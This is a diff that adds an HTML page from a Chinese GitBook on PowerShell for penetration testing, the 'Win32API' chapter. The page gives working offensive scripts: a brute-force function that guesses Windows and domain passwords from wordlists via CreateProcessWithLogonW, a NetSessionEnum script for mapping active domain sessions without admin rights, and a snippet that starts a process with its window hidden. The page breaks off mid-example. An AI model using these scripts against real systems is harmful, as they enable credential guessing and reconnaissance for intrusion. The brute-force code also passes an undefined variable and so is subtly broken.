@@ -1,0 +1,800 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Win32API · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="9. Dll注入&shellcode注入&exe注入.html" />
+    
+    
+    <link rel="prev" href="7. WMI对象操作.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    前言
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="kerberos/README.md">
+            
+                <span>
+            
+                    
+                    基础篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="2. 基础.html">
+            
+                <a href="2. 基础.html">
+            
+                    
+                    基础知识
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.2" data-path="3. 脚本编写与执行.html">
+            
+                <a href="3. 脚本编写与执行.html">
+            
+                    
+                    脚本编写与执行
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="4. Scoket网络编程.html">
+            
+                <a href="4. Scoket网络编程.html">
+            
+                    
+                    Scoket网络编程
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="5. 端口扫描与服务爆破.html">
+            
+                <a href="5. 端口扫描与服务爆破.html">
+            
+                    
+                    端口扫描与服务爆破
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" data-path="6. 多线程.html">
+            
+                <a href="6. 多线程.html">
+            
+                    
+                    多线程
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" data-path="ntlm-pian/README.md">
+            
+                <span>
+            
+                    
+                    进阶篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="7. WMI对象操作.html">
+            
+                <a href="7. WMI对象操作.html">
+            
+                    
+                    WMI&dot-net对象操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.3.2" data-path="8. Win32API.html">
+            
+                <a href="8. Win32API.html">
+            
+                    
+                    Win32API
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="9. Dll注入&shellcode注入&exe注入.html">
+            
+                <a href="9. Dll注入&shellcode注入&exe注入.html">
+            
+                    
+                    注入操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="10. 混淆.html">
+            
+                <a href="10. 混淆.html">
+            
+                    
+                    混淆
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="11. 日志操作.html">
+            
+                <a href="11. 日志操作.html">
+            
+                    
+                    日志操作
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="ldap-pian/README.md">
+            
+                <span>
+            
+                    
+                    应用篇
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.4.1" data-path="12. 实例使用场景.html">
+            
+                <a href="12. 实例使用场景.html">
+            
+                    
+                    实例使用场景
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4.2" data-path="13. Framework.html">
+            
+                <a href="13. Framework.html">
+            
+                    
+                    Framework
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="." >Win32API</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="powershell8-win32api">powershell(8)-win32API</h1>
+<p>Powershell&#x8FD8;&#x6709;&#x4E00;&#x5927;&#x5F3A;&#x5927;&#x4E4B;&#x5904;&#x5C31;&#x662F;&#x80FD;&#x8C03;&#x7528;Win32-Api(&#x5E9F;&#x8BDD;)&#xFF0C;&#x8FD9;&#x7ED9;&#x6211;&#x4EEC;&#x5E26;&#x6765;&#x4E86;&#x6781;&#x5927;&#x7684;&#x4FBF;&#x5229;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;API&#x80FD;&#x5B9E;&#x73B0;&#x7684;&#x529F;&#x80FD;&#x5F53;&#x6211;&#x4EEC;&#x5728;&#x6E17;&#x900F;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x6211;&#x4EEC;&#x80FD;&#x8F7B;&#x800C;&#x6613;&#x4E3E;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x800C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x5728;&#x5BF9;&#x65B9;&#x673A;&#x5668;&#x6267;&#x884C;&#x4E00;&#x6761;&#x547D;&#x4EE4;&#x5373;&#x53EF;&#x3002;</p>
+<p>&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x51E0;&#x4E2A;&#x811A;&#x672C;&#x6765;&#x4ECB;&#x7ECD;&#x6211;&#x4EEC;&#x5982;&#x4F55;&#x901A;&#x8FC7;Powershell&#x6765;&#x8C03;&#x7528;Win32Api&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230;&#x5B66;&#x4E60;&#x7684;&#x76EE;&#x7684;&#xFF0C;&#x4E5F;&#x80FD;&#x591F;&#x4E3A;&#x5927;&#x5BB6;&#x7684;&#x811A;&#x672C;&#x5DE5;&#x5177;&#x589E;&#x6DFB;xx....:)</p>
+<h2 id="runas">Runas</h2>
+<p>runas.exe&#x662F;&#x4E00;&#x4E2A;Windows&#x81EA;&#x5E26;&#x7684;&#x7A0B;&#x5E8F;&#xFF0C;&#x4E00;&#x6761;&#x7B80;&#x5355;&#x7684;&#x547D;&#x4EE4;<code>runas /user:corp\bob cmd</code>&#x53EF;&#x4EE5;&#x7528;&#x57DF;&#x5185;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7528;&#x6237;&#x7684;&#x8EAB;&#x4EFD;&#x5F00;&#x4E00;&#x4E2A;shell&#xFF0C;&#x5F53;&#x7136;&#x9700;&#x8981;&#x4F60;&#x8F93;&#x5165;&#x5BC6;&#x7801;</p>
+<p>&#x8FD9;&#x6B21;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x901A;&#x8FC7;Powershell&#x6765;&#x5B9E;&#x73B0;runas&#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x5C31;&#x4E0D;&#x4ECB;&#x7ECD;&#x4ED6;&#x76F4;&#x63A5;&#x7684;&#x7528;&#x5904;&#x4E86;&#xFF0C;&#x90A3;&#x4E48;runas&#x6211;&#x4EEC;&#x80FD;&#x60F3;&#x5230;&#x7684;&#x5229;&#x7528;&#x573A;&#x666F;&#x8FD8;&#x6709;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x5BF9;&#x7528;&#x6237;&#x7684;&#x5BC6;&#x7801;&#x8FDB;&#x884C;&#x7206;&#x7834;&#x3002;</p>
+<pre><code class="lang-powershell">
+<span class="hljs-keyword">function</span> Runas-Brute {
+
+&lt;<span class="hljs-comment">#</span>
+.SYNOPSIS
+    Parameters:
+
+     -UserList              Specifiy usernameList.
+
+     -PasswordList          Specify passwordList.
+
+     -Domain            Specify domain. Defaults to localhost <span class="hljs-keyword">if</span> not specified.
+
+     -LogonType         dwLogonFlags:
+                          <span class="hljs-number">0</span>x00000001 --&gt; LOGON_WITH_PROFILE
+                                           Log on, then load the user profile <span class="hljs-keyword">in</span> the HKEY_USERS registry
+                                           key. The <span class="hljs-keyword">function</span> returns after the profile is loaded.
+
+                          <span class="hljs-number">0</span>x00000002 --&gt; LOGON_NETCREDENTIALS_ONLY (= /netonly)
+                                           Log on, but use the specified credentials on the network only.
+                                           The new <span class="hljs-keyword">process</span> uses the same token as the caller, but the
+                                           system creates a new logon session within LSA, and the <span class="hljs-keyword">process</span>
+                                           uses the specified credentials as the default credentials.
+
+     -Binary            Full path of the module to be executed.
+
+     -Args              Arguments to pass to the module, e.g. <span class="hljs-string">&quot;/c calc.exe&quot;</span>. Defaults
+                        to <span class="hljs-literal">$null</span> <span class="hljs-keyword">if</span> not specified.
+
+
+.EXAMPLE
+    Start cmd with a local account
+    C:\PS&gt; Invoke-Runas -UserList SomeAccountList -PasswordList SomePassList -Binary C:\Windows\System32\cmd.exe -LogonType <span class="hljs-number">0</span>x1
+
+.EXAMPLE
+    Start cmd with remote credentials. Equivalent to <span class="hljs-string">&quot;/netonly&quot;</span> <span class="hljs-keyword">in</span> runas.
+    C:\PS&gt; Invoke-Runas -UserList SomeAccountList -PasswordList SomePassList -Domain SomeDomain -Binary C:\Windows\System32\cmd.exe -LogonType <span class="hljs-number">0</span>x2
+<span class="hljs-comment">#&gt;</span>
+
+    <span class="hljs-keyword">param</span> (
+        [Parameter(Mandatory = <span class="hljs-literal">$True</span>)]
+        [string]<span class="hljs-variable">$UserList</span>,
+        [Parameter(Mandatory = <span class="hljs-literal">$True</span>)]
+        [string]<span class="hljs-variable">$PasswordList</span>,
+        [Parameter(Mandatory = <span class="hljs-literal">$False</span>)]
+        [string]<span class="hljs-variable">$Domain</span>=<span class="hljs-string">&quot;.&quot;</span>,
+        [Parameter(Mandatory = <span class="hljs-literal">$True</span>)]
+        [string]<span class="hljs-variable">$Binary</span>,
+        [Parameter(Mandatory = <span class="hljs-literal">$False</span>)]
+        [string]<span class="hljs-variable">$Args</span>=<span class="hljs-literal">$null</span>,
+        [Parameter(Mandatory = <span class="hljs-literal">$True</span>)]
+        [int][ValidateSet(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)]
+        [string]<span class="hljs-variable">$LogonType</span>
+    )  
+
+    Add-Type -TypeDefinition @<span class="hljs-string">&quot;
+    using System;
+    using System.Diagnostics;
+    using System.Runtime.InteropServices;
+    using System.Security.Principal;
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public uint dwProcessId;
+        public uint dwThreadId;
+    }
+
+    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+    public struct STARTUPINFO
+    {
+        public uint cb;
+        public string lpReserved;
+        public string lpDesktop;
+        public string lpTitle;
+        public uint dwX;
+        public uint dwY;
+        public uint dwXSize;
+        public uint dwYSize;
+        public uint dwXCountChars;
+        public uint dwYCountChars;
+        public uint dwFillAttribute;
+        public uint dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
+    }
+
+    public static class Advapi32
+    {
+        [DllImport(&quot;</span>advapi32.dll<span class="hljs-string">&quot;, SetLastError=true, CharSet=CharSet.Unicode)]
+        public static extern bool CreateProcessWithLogonW(
+            String userName,
+            String domain,
+            String password,
+            int logonFlags,
+            String applicationName,
+            String commandLine,
+            int creationFlags,
+            int environment,
+            String currentDirectory,
+            ref  STARTUPINFO startupInfo,
+            out PROCESS_INFORMATION processInformation);
+    }
+
+    public static class Kernel32
+    {
+        [DllImport(&quot;</span>kernel32.dll<span class="hljs-string">&quot;)]
+        public static extern uint GetLastError();
+    }
+&quot;</span>@
+
+    <span class="hljs-comment"># StartupInfo Struct</span>
+    <span class="hljs-variable">$StartupInfo</span> = <span class="hljs-built_in">New-Object</span> STARTUPINFO
+    <span class="hljs-variable">$StartupInfo</span>.dwFlags = <span class="hljs-number">0</span>x00000001
+    <span class="hljs-variable">$StartupInfo</span>.wShowWindow = <span class="hljs-number">0</span>x0001
+    <span class="hljs-variable">$StartupInfo</span>.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(<span class="hljs-variable">$StartupInfo</span>)
+
+    <span class="hljs-comment"># ProcessInfo Struct</span>
+    <span class="hljs-variable">$ProcessInfo</span> = <span class="hljs-built_in">New-Object</span> PROCESS_INFORMATION
+
+    <span class="hljs-comment"># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5728;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x7684;shell</span>
+    <span class="hljs-variable">$GetCurrentPath</span> = (<span class="hljs-built_in">Get-Item</span> -Path <span class="hljs-string">&quot;.\&quot;</span> -Verbose).FullName
+
+    echo <span class="hljs-string">&quot;`n[&gt;] Calling Advapi32::CreateProcessWithLogonW&quot;</span>
+
+    <span class="hljs-variable">$usernames</span> = <span class="hljs-built_in">Get-Content</span> -ErrorAction SilentlyContinue -Path <span class="hljs-variable">$UserList</span>
+    <span class="hljs-variable">$passwords</span> = <span class="hljs-built_in">Get-Content</span> -ErrorAction SilentlyContinue -Path <span class="hljs-variable">$PasswordList</span>
+    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$usernames</span>) { 
+        <span class="hljs-variable">$usernames</span> = <span class="hljs-variable">$UserList</span>
+        <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-string">&quot;UserList file does not exist.&quot;</span>
+        <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-variable">$usernames</span>
+    }
+    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$passwords</span>) {
+        <span class="hljs-variable">$passwords</span> = <span class="hljs-variable">$PasswordList</span>
+        <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-string">&quot;PasswordList file does not exist.&quot;</span>
+        <span class="hljs-built_in">Write-Verbose</span> <span class="hljs-variable">$passwords</span>
+    }
+
+    :UsernameLoop <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$username</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$usernames</span>)
+    {
+        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$Password</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Passwords</span>)
+        {
+            <span class="hljs-variable">$CallResult</span> = [Advapi32]::CreateProcessWithLogonW(
+                <span class="hljs-variable">$User</span>, <span class="hljs-variable">$Domain</span>, <span class="hljs-variable">$Password</span>, <span class="hljs-variable">$LogonType</span>, <span class="hljs-variable">$Binary</span>,
+                <span class="hljs-variable">$Args</span>, <span class="hljs-number">0</span>x04000000, <span class="hljs-literal">$null</span>, <span class="hljs-variable">$GetCurrentPath</span>,
+                [ref]<span class="hljs-variable">$StartupInfo</span>, [ref]<span class="hljs-variable">$ProcessInfo</span>)
+
+            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$CallResult</span>) {
+                echo <span class="hljs-string">&quot;==&gt; $((New-Object System.ComponentModel.Win32Exception([int][Kernel32]::GetLastError())).Message)&quot;</span>
+                echo <span class="hljs-string">&quot;Test: &quot;</span> , <span class="hljs-variable">$User</span> , <span class="hljs-variable">$password</span>
+            } <span class="hljs-keyword">else</span> {
+                echo <span class="hljs-string">&quot;`n[+] Success, process details:&quot;</span>
+                <span class="hljs-built_in">Get-Process</span> -Id <span class="hljs-variable">$ProcessInfo</span>.dwProcessId
+                echo <span class="hljs-string">&quot;Test: &quot;</span> , <span class="hljs-variable">$User</span> , <span class="hljs-variable">$password</span>
+                <span class="hljs-keyword">break</span> UsernameLoop
+            } 
+        }
+    }
+}
+</code></pre>
+<p>&#x8FD9;&#x662F;&#x6574;&#x4E2A;&#x811A;&#x672C;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x90A3;&#x4E48;&#x4E0B;&#x9762;&#x5C31;&#x662F;&#x8FD0;&#x884C;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x6307;&#x5B9A;&#x597D;&#x4ED6;&#x7684;&#x5B57;&#x5178;&#x6587;&#x4EF6;&#x5373;&#x53EF;</p>
+<p><img src="https://raw.githubusercontent.com/myoss114/oss/master/uPic/win32api/1.png" alt=""></p>
+<h2 id="netsessionenum">NetSessionEnum</h2>
+<p>&#x4E0B;&#x9762;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4ECB;&#x7ECD;NetSessionEnum&#x3002;&#x9996;&#x5148;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4E86;&#x89E3;&#x7684;&#x662F;&#xFF0C;&#x5728;&#x771F;&#x5B9E;&#x7684;&#x6D4B;&#x8BD5;&#x8FC7;&#x7A0B;&#x4E2D;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x77E5;&#x9053;&#x57DF;&#x5185;&#x7684;&#x7EC4;&#x7EC7;&#x67B6;&#x6784;&#xFF0C;&#x57DF;&#x5185;&#x7684;&#x6D3B;&#x52A8;&#x673A;&#x5668;&#x7B49;&#x7B49;&#x3002;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;&#x7684;&#x5DE5;&#x5177;&#x4E5F;&#x6709;&#x5F88;&#x591A;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;PVEFindADUser.exe psloggedon.exe netsess.exe hunter.exe&#x7B49;&#x7B49;&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x8FD8;&#x662F;&#x9009;&#x62E9;powershell&#x4F5C;&#x4E3A;&#x6211;&#x4EEC;&#x7684;&#x6700;&#x4F73;&#x5229;&#x7528;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x5B9E;&#x4E0A;&#x9762;&#x8BB2;&#x5230;&#x7684;&#x5DE5;&#x5177;&#x90FD;&#x662F;&#x8C03;&#x7528;&#x4E86;NetSessionEnum API&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;Powershell&#x4E5F;&#x80FD;&#x591F;&#x975E;&#x5E38;&#x65B9;&#x4FBF;&#x7684;&#x8C03;&#x7528;&#x6B64;API&#xFF0C;&#x800C;&#x4E14;&#x6700;&#x91CD;&#x8981;&#x7684;&#x4E00;&#x70B9;&#xFF0C;&#x6211;&#x4EEC;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x57DF;&#x7BA1;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x4E00;&#x4E0B;&#x8FD9;&#x91CC;&#x5982;&#x4F55;&#x5B9E;&#x73B0;&#x3002;</p>
+<pre><code class="lang-powershell"><span class="hljs-keyword">function</span> Invoke-NetSessionEnum {
+&lt;<span class="hljs-comment">#</span>
+.SYNOPSIS
+
+    &#x4F7F;&#x7528;NetSessionEnum&#x53BB;&#x5217;&#x51FA;&#x76EE;&#x524D;&#x7684;&#x6D3B;&#x52A8;&#x1F3A8;
+
+.EXAMPLE
+    PS&gt; Invoke-NetSessionEnum -HostName SomeHostName
+
+<span class="hljs-comment">#&gt;</span>
+
+    <span class="hljs-keyword">param</span> (
+        [Parameter(Mandatory = <span class="hljs-literal">$True</span>)]
+        [string]<span class="hljs-variable">$HostName</span>
+    )  
+
+    Add-Type -TypeDefinition @<span class="hljs-string">&quot;
+    using System;
+    using System.Diagnostics;
+    using System.Runtime.InteropServices;
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SESSION_INFO_10
+    {
+        [MarshalAs(UnmanagedType.LPWStr)]public string OriginatingHost;
+        [MarshalAs(UnmanagedType.LPWStr)]public string DomainUser;
+        public uint SessionTime;
+        public uint IdleTime;
+    }
+
+    public static class Netapi32
+    {
+        [DllImport(&quot;</span>Netapi32.dll<span class="hljs-string">&quot;, SetLastError=true)]
+            public static extern int NetSessionEnum(
+                [In,MarshalAs(UnmanagedType.LPWStr)] string ServerName,
+                [In,MarshalAs(UnmanagedType.LPWStr)] string UncClientName,
+                [In,MarshalAs(UnmanagedType.LPWStr)] string UserName,
+                Int32 Level,
+                out IntPtr bufptr,
+                int prefmaxlen,
+                ref Int32 entriesread,
+                ref Int32 totalentries,
+                ref Int32 resume_handle);
+
+        [DllImport(&quot;</span>Netapi32.dll<span class="hljs-string">&quot;, SetLastError=true)]
+            public static extern int NetApiBufferFree(
+                IntPtr Buffer);
+    }
+&quot;</span>@
+
+    <span class="hljs-comment"># &#x521B;&#x5EFA; SessionInfo10 &#x7ED3;&#x6784;</span>
+    <span class="hljs-variable">$SessionInfo10</span> = <span class="hljs-built_in">New-Object</span> SESSION_INFO_10
+    <span class="hljs-variable">$SessionInfo10StructSize</span> = [System.Runtime.InteropServices.Marshal]::SizeOf(<span class="hljs-variable">$SessionInfo10</span>) <span class="hljs-comment"># Grab size to loop bufptr</span>
+    <span class="hljs-variable">$SessionInfo10</span> = <span class="hljs-variable">$SessionInfo10</span>.GetType()     
+    <span class="hljs-comment"># NetSessionEnum &#x7684;&#x53C2;&#x6570;</span>
+    <span class="hljs-variable">$OutBuffPtr</span> = [IntPtr]::Zero 
+    <span class="hljs-variable">$EntriesRead</span> = <span class="hljs-variable">$TotalEntries</span> = <span class="hljs-variable">$ResumeHandle</span> = <span class="hljs-number">0</span>
+    <span class="hljs-variable">$CallResult</span> = [Netapi32]::NetSessionEnum(<span class="hljs-variable">$HostName</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">10</span>, [ref]<span class="hljs-variable">$OutBuffPtr</span>, -<span class="hljs-number">1</span>, [ref]<span class="hljs-variable">$EntriesRead</span>, [ref]<span class="hljs-variable">$TotalEntries</span>, [ref]<span class="hljs-variable">$ResumeHandle</span>)
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$CallResult</span> <span class="hljs-nomarkup">-ne</span> <span class="hljs-number">0</span>){
+        echo <span class="hljs-string">&quot;something wrong!`nError Code: <span class="hljs-variable">$CallResult</span>&quot;</span>
+    }
+
+    <span class="hljs-keyword">else</span> {
+
+        <span class="hljs-keyword">if</span> ([System.IntPtr]::Size <span class="hljs-nomarkup">-eq</span> <span class="hljs-number">4</span>) {
+            echo <span class="hljs-string">&quot;`nNetapi32::NetSessionEnum Buffer Offset  --&gt; 0x$(&quot;</span>{<span class="hljs-number">0</span>:X8}<span class="hljs-string">&quot; -f <span class="hljs-variable">$OutBuffPtr</span>.ToInt32())&quot;</span>
+        }
+        <span class="hljs-keyword">else</span> {
+            echo <span class="hljs-string">&quot;`nNetapi32::NetSessionEnum Buffer Offset  --&gt; 0x$(&quot;</span>{<span class="hljs-number">0</span>:X16}<span class="hljs-string">&quot; -f <span class="hljs-variable">$OutBuffPtr</span>.ToInt64())&quot;</span>
+        }
+
+        echo <span class="hljs-string">&quot;Result-set contains <span class="hljs-variable">$EntriesRead</span> session(s)!&quot;</span>
+
+        <span class="hljs-comment"># Change buffer offset to int</span>
+        <span class="hljs-variable">$BufferOffset</span> = <span class="hljs-variable">$OutBuffPtr</span>.ToInt64()
+
+        <span class="hljs-comment"># Loop buffer entries and cast pointers as SessionInfo10</span>
+        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$Count</span> = <span class="hljs-number">0</span>; (<span class="hljs-variable">$Count</span> <span class="hljs-nomarkup">-lt</span> <span class="hljs-variable">$EntriesRead</span>); <span class="hljs-variable">$Count</span>++){
+            <span class="hljs-variable">$NewIntPtr</span> = <span class="hljs-built_in">New-Object</span> System.Intptr -ArgumentList <span class="hljs-variable">$BufferOffset</span>
+            <span class="hljs-variable">$Info</span> = [system.runtime.interopservices.marshal]::PtrToStructure(<span class="hljs-variable">$NewIntPtr</span>,[type]<span class="hljs-variable">$SessionInfo10</span>)
+            <span class="hljs-variable">$Info</span>
+            <span class="hljs-variable">$BufferOffset</span> = <span class="hljs-variable">$BufferOffset</span> + <span class="hljs-variable">$SessionInfo10StructSize</span>
+        }
+
+        echo <span class="hljs-string">&quot;`nCalling NetApiBufferFree, no memleaks here!&quot;</span>
+        [Netapi32]::NetApiBufferFree(<span class="hljs-variable">$OutBuffPtr</span>) |<span class="hljs-built_in">Out-Null</span>
+    }
+}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/myoss114/oss/master/uPic/win32api/2.png" alt=""></p>
+<h2 id="createprocess">CreateProcess</h2>
+<p>&#x6700;&#x540E;&#x6211;&#x4EEC;&#x5728;&#x770B;&#x4E00;&#x4E2A;&#x6211;&#x4EEC;&#x7528;&#x7684;&#x6700;&#x591A;&#x7684;API&#x4F8B;&#x5B50;&#xFF1A;&#x8FDB;&#x7A0B;&#x521B;&#x5EFA;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8FDC;&#x7A0B;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x7A97;&#x53E3;&#x800C;&#x53BB;token&#x7531;&#x6211;&#x4EEC;&#x6307;&#x5B9A;&#x7684;&#x8FDB;&#x7A0B;&#xFF0C;&#x81F3;&#x4E8E;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8FD9;&#x4E48;&#x5E72;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x81EA;&#x5DF1;&#x9886;&#x609F;&#x3002;&#x90A3;&#x4E48;CreateProcess API&#x5C31;&#x80FD;&#x6EE1;&#x8DB3;&#x6211;&#x4EEC;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x6211;&#x4EEC;&#x6765;&#x770B;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;:</p>
+<pre><code class="lang-powershell">Add-Type -TypeDefinition @<span class="hljs-string">&quot;
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+[StructLayout(LayoutKind.Sequential)]
+public struct PROCESS_INFORMATION
+{
+ public IntPtr hProcess;
+ public IntPtr hThread;
+ public uint dwProcessId;
+ public uint dwThreadId;
+}
+
+[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+public struct STARTUPINFO
+{
+ public uint cb;
+ public string lpReserved;
+ public string lpDesktop;
+ public string lpTitle;
+ public uint dwX;
+ public uint dwY;
+ public uint dwXSize;
+ public uint dwYSize;
+ public uint dwXCountChars;
+ public uint dwYCountChars;
+ public uint dwFillAttribute;
+ public uint dwFlags;
+ public short wShowWindow;
+ public short cbReserved2;
+ public IntPtr lpReserved2;
+ public IntPtr hStdInput;
+ public IntPtr hStdOutput;
+ public IntPtr hStdError;
+}
+
+[StructLayout(LayoutKind.Sequential)]
+public struct SECURITY_ATTRIBUTES
+{
+ public int length;
+ public IntPtr lpSecurityDescriptor;
+ public bool bInheritHandle;
+}
+
+public static class Kernel32
+{
+ [DllImport(&quot;</span>kernel32.dll<span class="hljs-string">&quot;, SetLastError=true)]
+ public static extern bool CreateProcess(
+ string lpApplicationName,
+ string lpCommandLine,
+ ref SECURITY_ATTRIBUTES lpProcessAttributes, 
+ ref SECURITY_ATTRIBUTES lpThreadAttributes,
+ bool bInheritHandles,
+ uint dwCreationFlags, 
+ IntPtr lpEnvironment,
+ string lpCurrentDirectory,
+ ref STARTUPINFO lpStartupInfo, 
+ out PROCESS_INFORMATION lpProcessInformation);
+}
+&quot;</span>@
+
+<span class="hljs-comment"># StartupInfo Struct</span>
+<span class="hljs-variable">$StartupInfo</span> = <span class="hljs-built_in">New-Object</span> STARTUPINFO
+<span class="hljs-variable">$StartupInfo</span>.dwFlags = <span class="hljs-number">0</span>x00000001 <span class="hljs-comment"># STARTF_USESHOWWINDOW</span>
+<span class="hljs-variable">$StartupInfo</span>.wShowWindow = <span class="hljs-number">0</span>x0000 <span class="hljs-comment"># SW_HIDE</span>
+<span class="hljs-variable">$StartupInfo</span>.cb = [System.Runtime.InteropServices.Marshal]::SizeOf(<span class="hljs-variable">$StartupInfo</span>) <span class="hljs-comment"># Struct Size</span>
+
+<span class="hljs-comment"># ProcessInfo Struct</span>
+<span class="hljs-variable">$ProcessInfo</span> = <span class="hljs-built_in">New-Object</span> PROCESS_INFORMATION
+
